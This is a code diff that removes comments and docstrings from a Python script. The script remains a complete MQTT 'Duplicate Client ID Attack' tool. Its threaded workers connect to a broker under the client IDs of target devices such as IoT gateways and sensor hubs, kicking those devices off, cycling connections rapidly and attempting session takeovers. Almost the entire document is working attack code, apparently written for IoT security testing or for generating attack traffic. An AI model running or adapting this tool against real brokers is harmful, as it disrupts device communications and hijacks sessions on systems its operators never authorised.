@@ -1,5 +1,3 @@
-"""MQTT Duplicate Client ID Attack - creates conflicts with duplicate client identifiers."""
-
 import argparse
 import csv
 import json
@@ -10,7 +8,6 @@ import time
 from datetime import datetime, timezone
 
 import paho.mqtt.client as mqtt
-
 
 class DuplicateIDAttack:
     def __init__(self, args):
@@ -24,7 +21,6 @@ class DuplicateIDAttack:
         self.disconnections = 0
         self.connection_conflicts = 0
         
-        # Target client IDs for duplication
         self.target_client_ids = [
             "iot_gateway_001",
             "sensor_hub_main", 
@@ -68,8 +64,6 @@ class DuplicateIDAttack:
             ])
 
     def create_duplicate_client(self, target_client_id, worker_id):
-        """Create a client with duplicate ID and attempt connection"""
-        # Use exact same client ID as target
         duplicate_client_id = target_client_id
         client = mqtt.Client(client_id=duplicate_client_id, clean_session=self.args.clean_session)
         
@@ -79,7 +73,6 @@ class DuplicateIDAttack:
         connection_start = time.time()
         connected = False
         
-        # Set up callbacks
         def on_connect(client, userdata, flags, rc):
             nonlocal connected
             self.connection_attempts += 1
@@ -115,7 +108,6 @@ class DuplicateIDAttack:
             print(f"[Worker {worker_id}] Client {duplicate_client_id}: disconnected rc={rc}")
 
         def on_publish(client, userdata, mid):
-            # Log successful publishes from duplicate client
             self.log_connection(duplicate_client_id, "publish", "success", 0, 
                               False, f"mid={mid},worker={worker_id}", False)
 
@@ -123,19 +115,16 @@ class DuplicateIDAttack:
         client.on_disconnect = on_disconnect
         client.on_publish = on_publish
         
-        # Attempt connection
         try:
             client.connect(self.args.broker, self.args.port, self.args.keepalive)
             client.loop_start()
             
-            # Wait for connection
             timeout = 10
             start_time = time.time()
             while not connected and time.time() - start_time < timeout and not self.stop_event.is_set():
                 time.sleep(0.1)
             
             if connected:
-                # Maintain connection and do some activity
                 self.maintain_duplicate_connection(client, duplicate_client_id, worker_id)
             
         except Exception as e:
@@ -151,15 +140,13 @@ class DuplicateIDAttack:
                 pass
 
     def maintain_duplicate_connection(self, client, client_id, worker_id):
-        """Maintain connection with duplicate client and perform activities"""
-        activity_interval = random.uniform(5, 15)  # 5-15 seconds between activities
+        activity_interval = random.uniform(5, 15)
         topic = f"duplicate/{client_id}/status"
         
         message_count = 0
         
         while not self.stop_event.is_set():
             try:
-                # Publish status message
                 payload = json.dumps({
                     "timestamp": datetime.now().isoformat(),
                     "client_id": client_id,
@@ -176,7 +163,6 @@ class DuplicateIDAttack:
                     self.log_connection(client_id, "publish", "failed", result.rc,
                                       False, f"mid={result.mid},worker={worker_id}", False)
                 
-                # Subscribe to test topics to maintain activity
                 if message_count % 5 == 0:
                     test_topic = f"test/{client_id}/echo"
                     client.subscribe(test_topic, qos=0)
@@ -192,7 +178,6 @@ class DuplicateIDAttack:
                 break
 
     def rapid_duplicate_connections(self, target_client_id, worker_id):
-        """Rapidly create and disconnect duplicate connections"""
         connection_count = 0
         
         while not self.stop_event.is_set() and connection_count < self.args.max_rapid_connections:
@@ -202,12 +187,10 @@ class DuplicateIDAttack:
                 client.username_pw_set(self.args.username, self.args.password)
             
             try:
-                # Quick connect and disconnect
                 start_time = time.time()
-                client.connect(self.args.broker, self.args.port, 10)  # Short keepalive
+                client.connect(self.args.broker, self.args.port, 10)
                 client.loop_start()
                 
-                # Brief connection
                 time.sleep(random.uniform(1, 3))
                 
                 client.loop_stop()
@@ -222,7 +205,6 @@ class DuplicateIDAttack:
                 if connection_count % 10 == 0:
                     print(f"[Worker {worker_id}] Rapid connections: {connection_count}")
                 
-                # Small delay between rapid connections
                 time.sleep(random.uniform(0.5, 2))
                 
             except Exception as e:
@@ -231,8 +213,6 @@ class DuplicateIDAttack:
                 time.sleep(1)
 
     def session_takeover_attack(self, target_client_id, worker_id):
-        """Attempt to take over existing sessions"""
-        # Try both clean and persistent sessions
         for clean_session in [False, True]:
             if self.stop_event.is_set():
                 break
@@ -261,7 +241,6 @@ class DuplicateIDAttack:
                 client.connect(self.args.broker, self.args.port, self.args.keepalive)
                 client.loop_start()
                 
-                # Hold connection briefly
                 time.sleep(random.uniform(3, 8))
                 
                 client.loop_stop()
@@ -271,10 +250,9 @@ class DuplicateIDAttack:
                 self.log_connection(target_client_id, "takeover_attempt", "exception", -1,
                                   False, f"session_type={session_type},error={str(e)},worker={worker_id}", False)
             
-            time.sleep(2)  # Delay between attempts
+            time.sleep(2)
 
     def attack_worker(self, worker_id):
-        """Worker thread for duplicate ID attack"""
         print(f"[Worker {worker_id}] Starting duplicate ID attack")
         
         target_client_id = self.target_client_ids[worker_id % len(self.target_client_ids)]
@@ -282,17 +260,14 @@ class DuplicateIDAttack:
         
         try:
             if attack_type == 0:
-                # Persistent duplicate connections
                 print(f"[Worker {worker_id}] Persistent duplicate attack on {target_client_id}")
                 self.create_duplicate_client(target_client_id, worker_id)
                 
             elif attack_type == 1:
-                # Rapid duplicate connections
                 print(f"[Worker {worker_id}] Rapid duplicate attack on {target_client_id}")
                 self.rapid_duplicate_connections(target_client_id, worker_id)
                 
             else:
-                # Session takeover attempts
                 print(f"[Worker {worker_id}] Session takeover attack on {target_client_id}")
                 self.session_takeover_attack(target_client_id, worker_id)
                 
@@ -300,23 +275,20 @@ class DuplicateIDAttack:
             print(f"[Worker {worker_id}] Worker exception: {e}")
 
     def run(self):
-        """Start the duplicate ID attack"""
         print(f"Starting Duplicate ID attack with {self.args.workers} workers")
         print(f"Target: {self.args.broker}:{self.args.port}")
         print(f"Target client IDs: {self.target_client_ids}")
         print(f"Clean session: {self.args.clean_session}")
         
-        # Start worker threads
         threads = []
         for i in range(self.args.workers):
             thread = threading.Thread(target=self.attack_worker, args=(i,))
             thread.daemon = True
             thread.start()
             threads.append(thread)
-            time.sleep(0.5)  # Stagger worker starts
+            time.sleep(0.5)
         
         try:
-            # Statistics reporting
             while True:
                 time.sleep(10)
                 print(f"\n=== Duplicate ID Attack Statistics ===")
@@ -330,7 +302,6 @@ class DuplicateIDAttack:
             print("\nStopping duplicate ID attack...")
             self.stop_event.set()
             
-            # Wait for threads to finish
             for thread in threads:
                 thread.join(timeout=10)
             
@@ -338,7 +309,6 @@ class DuplicateIDAttack:
             print(f"Total connection attempts: {self.connection_attempts}")
             print(f"Successful connections: {self.successful_connections}")
             print(f"Connection conflicts detected: {self.connection_conflicts}")
-
 
 def main():
     parser = argparse.ArgumentParser(description="MQTT Duplicate Client ID Attack")
@@ -364,7 +334,6 @@ def main():
         attack.run()
     finally:
         attack.close()
-
 
 if __name__ == "__main__":
     main()
